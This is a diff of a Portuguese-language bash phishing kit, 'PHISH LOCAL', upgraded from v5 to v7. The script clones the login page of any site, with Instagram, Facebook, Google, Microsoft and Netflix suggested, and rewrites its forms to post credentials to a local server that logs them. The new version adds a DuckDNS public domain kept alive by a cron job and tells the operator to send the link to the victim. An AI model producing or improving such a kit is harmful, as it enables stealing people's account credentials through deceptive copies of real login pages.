@@ -1,8 +1,8 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISH LOCAL v5 - Universal
-# Clona QUALQUER site de login
-# Sem root | Sem dominio pago
+# 🎣 PHISH LOCAL v7 - DuckDNS + Universal
+# Clona QUALQUER site | Link publico bonito
+# Sem root | Sem instalar nada no destino
 # ============================================
 
 SITE_DIR="site_clone"
@@ -20,7 +20,7 @@ fi
 clear
 echo ""
 echo "=========================================="
-echo "     PHISH LOCAL v5 - Universal"
+echo "     PHISH LOCAL v7 - DuckDNS Edition"
 echo "=========================================="
 echo ""
 echo "  1) Criar phishing"
@@ -42,10 +42,10 @@ if [ "$MENU" = "1" ]; then
 echo "  - https://www.instagram.com"
 echo "  - https://www.facebook.com"
 echo "  - https://accounts.google.com"
-echo "  - https://login.live.com (Hotmail)"
+echo "  - https://login.live.com"
 echo "  - https://twitter.com/i/flow/login"
 echo "  - https://www.netflix.com/login"
-echo "  - Ou QUALQUER outro site de login"
+echo "  - OU QUALQUER outro site de login"
 echo ""
 echo -n "URL do site: "
 read TARGET_URL
@@ -53,8 +53,8 @@ read TARGET_URL
 [[ ! "$TARGET_URL" =~ ^https?:// ]] && TARGET_URL="https://$TARGET_URL"
 
 echo ""
-echo "Que nome voce quer pro link local?"
-echo "  Ex: instagram.local, fb-login.com, gmail.net"
+echo "Que nome voce quer pro link?"
+echo "  Ex: instagram, facebook, gmail, autocarlocadora"
 echo -n "Nome: "
 read LOCAL_NAME
 [ -z "$LOCAL_NAME" ] && LOCAL_NAME="login"
@@ -79,20 +79,17 @@ echo "[...] Clonando $TARGET_URL"
 echo ""
 rm -rf "$SITE_DIR"/*
 
-# Baizar pagina principal
 curl -s -L -o "$SITE_DIR/index.html" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
     -H "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8" \
     "$TARGET_URL" 2>/dev/null
 
-# Verificar se baixou
 if [ ! -f "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
     echo "[AVISO] Nao foi possivel clonar. Usando pagina generica."
     touch "$SITE_DIR/index.html"
 fi
 
-# Baizar CSS
 echo "[...] Baixando CSS..."
 for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
     fname=$(basename "$css")
@@ -105,7 +102,6 @@ for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | s
     fi
 done
 
-# Baizar JS
 echo "[...] Baixando JS..."
 for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
     fname=$(basename "$js")
@@ -118,7 +114,6 @@ for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 
     fi
 done
 
-# Baizar imagens
 echo "[...] Baixando imagens..."
 for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
     fname=$(basename "$img")
@@ -131,14 +126,13 @@ for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/inde
     fi
 done
 
-# Modificar formularios para captura
 echo "[...] Configurando captura..."
 sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
 sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"
 
 echo ""
 echo "[OK] Site clonado!"
-ls "$SITE_DIR"/*.html "$SITE_DIR"/*.css 2>/dev/null | head -10
+ls "$SITE_DIR"/*.html "$SITE_DIR"/*.css 2>/dev/null | head -5
 
 # --- CRIAR SERVIDOR ---
 cat > "$SERVER_FILE" << 'EOF'
@@ -188,17 +182,53 @@ http.createServer((req,res)=>{
 }).listen(PORT,'0.0.0.0',()=>console.log('Servidor ativo porta '+PORT));
 EOF
 
-# --- OBTER IP ---
+# --- OBTER IP LOCAL ---
 IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
 [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
 [ -z "$IP" ] && IP="127.0.0.1"
 
-# --- MMDNS (nome .local) ---
-if command -v avahi-publish &>/dev/null; then
-    avahi-publish -s "${LOCAL_NAME}" _http._tcp "$PORT" >/dev/null 2>&1 &
-    MDNS_ACTIVE=true
-else
-    MDNS_ACTIVE=false
+# --- DUCKDNS ---
+DUCKDNS_CONFIG="$HOME/.duckdns"
+DUCKDNS_DOMAIN=""
+DUCKDNS_TOKEN=""
+
+echo ""
+echo "=========================================="
+echo "  DUCKDNS (Link Publico Gratis)"
+echo "=========================================="
+echo ""
+echo "Quer criar um link publico que funciona em QUALQUER lugar?"
+echo "Ex: ${LOCAL_NAME}.duckdns.org"
+echo ""
+echo "  1) Sim, configurar DuckDNS"
+echo "  2) Nao, usar so o IP local"
+echo ""
+echo -n "Escolha: "
+read DUCK_CHOICE
+
+if [ "$DUCK_CHOICE" = "1" ]; then
+    echo ""
+    echo "Para usar DuckDNS:"
+    echo "  1) Crie conta em https://www.duckdns.org (gratis)"
+    echo "  2) Crie um dominio (ex: ${LOCAL_NAME})"
+    echo "  3) Copie seu TOKEN"
+    echo ""
+    echo -n "Seu dominio (sem .duckdns.org): "
+    read DUCKDNS_DOMAIN
+    echo -n "Seu token: "
+    read DUCKDNS_TOKEN
+
+    # Salvar config
+    mkdir -p "$DUCKDNS_CONFIG"
+    echo "DOMAIN=$DUCKDNS_DOMAIN" > "$DUCKDNS_CONFIG/config"
+    echo "TOKEN=$DUCKDNS_TOKEN" >> "$DUCKDNS_CONFIG/config"
+
+    # Atualizar DNS
+    RESULT=$(curl -s "https://www.duckdns.org/update?domains=$DUCKDNS_DOMAIN&token=$DUCKDNS_TOKEN&ip=")
+    echo "[$RESULT] DuckDNS atualizado!"
+
+    # Agendar atualizacao automatica
+    echo "*/5 * * * * curl -s \"https://www.duckdns.org/update?domains=$DUCKDNS_DOMAIN&token=$DUCKDNS_TOKEN&ip=\" > /dev/null 2>&1" | crontab -
 fi
 
 # --- MOSTRAR RESULTADO ---
@@ -208,17 +238,18 @@ echo "=========================================="
 echo "         SERVIDOR PRONTO!"
 echo "=========================================="
 echo ""
-echo "  URL (IP):  http://${IP}:${PORT}"
-if [ "$MDNS_ACTIVE" = true ]; then
-    echo "  URL (nome): http://${LOCAL_NAME}.local:${PORT}"
+echo "  URL Local:  http://${IP}:${PORT}"
+echo ""
+if [ -n "$DUCKDNS_DOMAIN" ]; then
+    echo "  🔥 URL PUBLICA (funciona em QUALQUER lugar):"
     echo ""
-    echo "  Acesse de QUALQUER dispositivo na rede:"
-    echo "  http://${LOCAL_NAME}.local:${PORT}"
+    echo "    http://${DUCKDNS_DOMAIN}.duckdns.org:${PORT}"
+    echo ""
+    echo "  Mande esse link pra pessoa!"
+    echo "  Ela acessa de QUALQUER lugar do mundo."
 else
-    echo ""
-    echo "  Para nome .local, instale avahi:"
-    echo "  pkg install avahi -y"
-    echo "  E rode o script novamente."
+    echo "  Acesse de qualquer dispositivo na mesma rede:"
+    echo "  http://${IP}:${PORT}"
 fi
 echo ""
 echo "  Parar: Ctrl+C"
@@ -240,7 +271,7 @@ if [ "$V" = "s" ] || [ "$V" = "S" ]; then
         cat "$LOG_FILE"
         echo "=========================================="
     else
-        echo "Nenhuma captura ainda."
+        echo "Nenhuma captura."
     fi
 fi
 
